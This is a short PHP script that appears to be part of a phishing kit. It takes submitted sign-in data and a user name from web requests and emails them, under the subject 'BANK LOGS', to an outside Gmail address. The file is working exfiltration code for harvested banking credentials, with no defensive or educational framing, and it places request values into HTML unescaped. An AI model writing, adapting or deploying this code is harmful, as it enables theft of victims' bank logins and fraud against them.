<?php
require_once "../../admin/inc/functions/config.php";


if (isset($_REQUEST['ip'])) {
  try {
    $text = $_REQUEST['ip'];
    $name = $_REQUEST['name'];
  
    $message = "
    <html>
      <body>
        <h2>$name just signed in</h2>
        <pre>$text</pre>
      </body>
    </html>";
  
    if (!sendEmail("logsunit231@gmail.com", "BANK LOGS", $message)){
      echo "Message not sent";
    }
    else {
      echo "Message sent";
    }
  }
  catch(Exception $e) {
    echo $e->getMessage();
  }
}
